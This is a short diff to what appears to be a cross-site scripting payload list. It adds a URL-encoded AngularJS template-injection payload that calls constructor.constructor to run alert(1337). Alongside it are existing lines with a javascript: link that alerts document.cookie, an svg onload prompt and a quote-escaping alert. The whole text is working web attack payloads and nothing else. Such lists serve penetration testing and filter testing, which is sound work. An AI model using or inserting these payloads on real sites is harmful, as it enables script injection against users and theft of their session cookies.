@@ -4,3 +4,4 @@
 <iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt;
 a"><svg/onload=prompt(1)>
 \'-alert(1)//
+%7B%7Bconstructor.constructor(%27alert(1337)%27)()%7D%7D
